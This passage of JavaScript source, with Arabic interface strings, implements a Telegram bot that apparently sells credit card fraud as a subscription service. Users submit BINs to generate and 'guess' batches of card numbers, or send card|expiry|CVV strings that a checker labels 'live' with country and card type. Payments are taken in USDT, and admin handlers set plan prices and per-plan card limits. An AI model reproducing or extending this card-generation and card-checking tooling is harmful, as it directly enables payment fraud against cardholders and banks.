            if(action==='approve'){ 
                const end=new Date(); end.setMonth(end.getMonth()+1); 
                updateSubscriber(proof.userId,{plan:proof.plan,startDate:new Date().toISOString(),endDate:end.toISOString()}); 
                updatePaymentProof(proofId,'approved'); 
                const pending=getPendingPayment(proof.userId,proof.plan); 
                if(pending) updatePendingPayment(pending.id,'approved'); 
                const ul=userLang.get(proof.userId)||'ar'; 
                await bot.sendMessage(proof.userId, translations[ul].payment_approved.replace('{plan}',plans[proof.plan][`name${ul==='ar'?'Ar':'En'}`])).catch(()=>{}); 
                await bot.sendMessage(cid,`✅ تم تفعيل الاشتراك للمستخدم ${proof.userId}`).catch(()=>{}); 
            } else { 
                updatePaymentProof(proofId,'rejected'); 
                const ul=userLang.get(proof.userId)||'ar'; 
                await bot.sendMessage(proof.userId, translations[ul].payment_rejected).catch(()=>{}); 
                await bot.sendMessage(cid,`❌ تم رفض الاشتراك للمستخدم ${proof.userId}`).catch(()=>{}); 
            } 
            await bot.editMessageReplyMarkup({ inline_keyboard: [[{text: action==='approve'? '✅ تمت الموافقة' : '❌ تم الرفض', callback_data: 'done'}]] }, { chat_id: cid, message_id: query.message.message_id }).catch(()=>{});
        } 
        return; 
    }
});

// ==========================================
// معالجة الرسائل النصية والصور
// ==========================================
bot.on('message', async (msg) => {
    const cid=msg.chat.id, text=msg.text;
    const lang=userLang.get(cid)||'ar', dict=translations[lang];
    const state=userStates.get(cid);

    if(msg.photo){
        const photo=msg.photo[msg.photo.length-1];
        const fileId=photo.file_id;
        const pendingItem=Object.values(loadData().pendingPayments).find(p=>p.userId===cid && (p.status==='waiting_payment' || p.status==='proof_sent'));
        if(pendingItem){
            const proof=createPaymentProof(cid, pendingItem.plan, fileId, msg.message_id);
            const caption=`📸 إثبات دفع جديد\nالمستخدم: \`${cid}\`\nالخطة: ${pendingItem.plan}\nالمبلغ: ${pendingItem.amount} USDT\nالكود: \`${pendingItem.code}\``;
            const adminKeyboard={ reply_markup:{ inline_keyboard:[[{text:'✅ موافقة',callback_data:`approve_payment_${proof.id}`},{text:'❌ رفض',callback_data:`reject_payment_${proof.id}`}]] } };
            for(const adminId of adminSet) await bot.sendPhoto(adminId, fileId, { caption, parse_mode: 'Markdown', ...adminKeyboard }).catch(()=>{});
            await bot.sendMessage(cid, dict.payment_received).catch(()=>{});
            updatePendingPayment(pendingItem.id, 'proof_sent');
        } 
        return;
    }

    if(!text || text.startsWith('/')) return;

    if(text.includes('|') && text.length > 20){
        await bot.sendMessage(cid, dict.single_checking).catch(()=>{});
        const result=await checkSingleCard(text,cid);
        if(result && result.isLive){
            const flag=getFlag(result.country);
            const cardType=getCardType(text.split('|')[0]);
            const liveText=dict.live_result.replace('{card}',text).replace('{type}',cardType).replace('{country}',result.country).replace('{flag}',flag);
            const btns=getCopyButtons(text,lang);
            await bot.sendMessage(cid, liveText, { parse_mode:'Markdown', ...btns }).catch(()=>{});
        }
        return;
    }

    if(state && state.step==='awaiting_bin'){
        if(/^\d+$/.test(text) && text.length >= 6){
            let bin=text.slice(0,6); while(bin.length<6) bin+=Math.floor(Math.random()*10);
            state.currentBin=bin;
            if(state.defaultCount){
                state.bins.push(bin);
                await bot.sendMessage(cid, `✅ تم إضافة BIN: \`${bin}\` بعدد فيزات ${state.defaultCount}\nالحملات الحالية: ${state.bins.length}`, {parse_mode: 'Markdown'}).catch(()=>{});
                const plans=getPlans(), subscriber=getSubscriber(cid), maxC=plans[subscriber.plan].campaignsLimit;
                let btns=[];
                if(state.bins.length>=maxC) btns=[[{text:'🚀 ترقية الاشتراك',callback_data:'menu_subscribe'}],[{text:'🎯 تغيير العدد',callback_data:'set_default_count'}],[{text:'🚀 بدء التخمين',callback_data:'start_with_default'}],[{text:dict.cancel_btn,callback_data:'cancel_guess'}]];
                else btns=[[{text:'➕ إضافة BIN آخر',callback_data:'add_another_bin'}],[{text:'🎯 تغيير العدد',callback_data:'set_default_count'}],[{text:'🚀 بدء التخمين',callback_data:'start_with_default'}],[{text:dict.cancel_btn,callback_data:'cancel_guess'}]];
                await bot.sendMessage(cid, 'ماذا تريد أن تفعل؟', { reply_markup:{ inline_keyboard:btns } }).catch(()=>{});
                state.step='awaiting_decision';
            } else {
                state.step='awaiting_count';
                await bot.sendMessage(cid, `🔢 كم عدد الفيزات التي تريد تخمينها على BIN: \`${bin}\`؟\n(الحد الأدنى 5، الأقصى ${getSubscriber(cid).cardsLimit})`, {parse_mode: 'Markdown'}).catch(()=>{});
            }
        } else {
            await bot.sendMessage(cid, '⚠️ يرجى إرسال أرقام فقط (6 أرقام على الأقل).').catch(()=>{});
        }
        return;
    }

    if(state && (state.step==='awaiting_count' || state.step==='awaiting_default_count')){
        const count=parseInt(text);
        if(isNaN(count)){ await bot.sendMessage(cid,'⚠️ يرجى إرسال رقم صحيح.').catch(()=>{}); return; }
        const subscriber=getSubscriber(cid), maxCards=subscriber.cardsLimit;
        if(!adminSet.has(cid) && (count<5 || count>maxCards)){
            await bot.sendMessage(cid, dict.count_out_of_range.replace('{max}',maxCards)).catch(()=>{});
            if(subscriber.plan === 'free') await bot.sendMessage(cid, '💡 قم بترقية خطتك لزيادة العدد.', { reply_markup:{ inline_keyboard:[[{text:'💎 عرض الاشتراكات',callback_data:'menu_subscribe'}]] } }).catch(()=>{});
            if(state.step==='awaiting_count') state.step='awaiting_bin';
            else state.step='awaiting_decision';
            return;
        }
        
        if(state.step==='awaiting_count') {
            state.bins.push(state.currentBin);
            state.defaultCount=count;
            delete state.currentBin;
            await bot.sendMessage(cid, `✅ تم إضافة BIN: \`${state.bins[state.bins.length-1]}\` بعدد ${count}\nالحملات الحالية: ${state.bins.length}\nتم تعيين العدد كافتراضي.`, {parse_mode: 'Markdown'}).catch(()=>{});
        } else {
            state.defaultCount=count;
            await bot.sendMessage(cid, `✅ تم تعديل العدد لكل حملة ليصبح ${count}.`).catch(()=>{});
        }

        const plans=getPlans(), maxC=plans[subscriber.plan].campaignsLimit;
        let btns=[];
        if(state.bins.length>=maxC) btns=[[{text:'🚀 بدء التخمين',callback_data:'start_with_default'}],[{text:dict.cancel_btn,callback_data:'cancel_guess'}]];
        else btns=[[{text:'➕ إضافة BIN آخر',callback_data:'add_another_bin'}],[{text:'🚀 بدء التخمين',callback_data:'start_with_default'}],[{text:dict.cancel_btn,callback_data:'cancel_guess'}]];
        await bot.sendMessage(cid, 'ماذا تريد أن تفعل؟', { reply_markup:{ inline_keyboard:btns } }).catch(()=>{});
        state.step='awaiting_decision';
        return;
    }

    if(state && state.step.startsWith('admin_')){
        if(!adminSet.has(cid)) return;
        
        if(state.step==='admin_edit_price'){
            const parts=text.split('=');
            if(parts.length!==2){ await bot.sendMessage(cid,'⚠️ صيغة غير صحيحة').catch(()=>{}); return; }
            const planKey=parts[0].trim().toLowerCase(), newPrice=parseFloat(parts[1]);
            if(isNaN(newPrice)){ await bot.sendMessage(cid,'⚠️ السعر يجب أن يكون رقماً').catch(()=>{}); return; }
            const plans=getPlans();
            if(!plans[planKey]){ await bot.sendMessage(cid,`⚠️ الخطة ${planKey} غير موجودة`).catch(()=>{}); return; }
            plans[planKey].price=newPrice; updatePlans(plans);
            await bot.sendMessage(cid,`✅ تم تحديث سعر خطة ${planKey} إلى ${newPrice} USDT`).catch(()=>{});
        }
        else if(state.step==='admin_edit_speed'){
            const parts=text.split('=');
            if(parts.length!==2){ await bot.sendMessage(cid,'⚠️ صيغة غير صحيحة').catch(()=>{}); return; }
            const planKey=parts[0].trim().toLowerCase(), newSpeed=parseInt(parts[1]);
            if(isNaN(newSpeed)||newSpeed<1||newSpeed>100){ await bot.sendMessage(cid,'⚠️ السرعة يجب أن تكون بين 1 و 100').catch(()=>{}); return; }
            const plans=getPlans();
            if(!plans[planKey]){ await bot.sendMessage(cid,`⚠️ الخطة ${planKey} غير موجودة`).catch(()=>{}); return; }
            plans[planKey].speed=newSpeed; updatePlans(plans);
            await bot.sendMessage(cid,`✅ تم تحديث سرعة خطة ${planKey} إلى ${newSpeed}%`).catch(()=>{});
        }
        else if(state.step==='admin_add_plan'){
            const parts=text.split('|');
            if(parts.length!==6){ await bot.sendMessage(cid,'⚠️ صيغة غير صحيحة').catch(()=>{}); return; }
            const [nameAr,nameEn,price,cardsLimit,campaignsLimit,speed]=parts;
            const newPrice=parseFloat(price), newCards=parseInt(cardsLimit), newCamp=parseInt(campaignsLimit), newSpeed=parseInt(speed);
            if(isNaN(newPrice)||isNaN(newCards)||isNaN(newCamp)||isNaN(newSpeed)){ await bot.sendMessage(cid,'⚠️ جميع القيم يجب أن تكون أرقاماً').catch(()=>{}); return; }
            const plans=getPlans(); const key=nameEn.toLowerCase();
            plans[key]={nameAr,nameEn,price:newPrice,cardsLimit:newCards,campaignsLimit:newCamp,speed:newSpeed};
            updatePlans(plans);
            await bot.sendMessage(cid,`✅ تم إضافة الخطة الجديدة: ${nameAr}`).catch(()=>{});
        }
        else if(state.step==='admin_grant'){
            const parts=text.split(' ');
            if(parts.length!==2){ await bot.sendMessage(cid,'⚠️ صيغة غير صحيحة').catch(()=>{}); return; }
            const userId=parseInt(parts[0]), planKey=parts[1].toLowerCase();
            const plans=getPlans();
            if(!plans[planKey]){ await bot.sendMessage(cid,`⚠️ الخطة ${planKey} غير موجودة`).catch(()=>{}); return; }
            const end=new Date(); end.setMonth(end.getMonth()+1);
            updateSubscriber(userId,{plan:planKey,startDate:new Date().toISOString(),endDate:end.toISOString()});
            await bot.sendMessage(cid,`✅ تم منح اشتراك ${planKey} للمستخدم \`${userId}\``, {parse_mode: 'Markdown'}).catch(()=>{});
        }
        else if(state.step==='admin_remove'){
            const userId=parseInt(text);
            if(isNaN(userId)){ await bot.sendMessage(cid,'⚠️ معرف غير صالح').catch(()=>{}); return; }
            updateSubscriber(userId,{plan:'free',startDate:new Date().toISOString(),endDate:new Date(Date.now()+365*24*60*60*1000).toISOString()});
            await bot.sendMessage(cid,`✅ تم إلغاء اشتراك المستخدم \`${userId}\` ورجوعه للمجاني`, {parse_mode: 'Markdown'}).catch(()=>{});
        }
        
        userStates.delete(cid); 
        await showAdminPanel(cid);
        return;
    }
});

console.log('✅ Bot started securely with anti-crash protocols!');
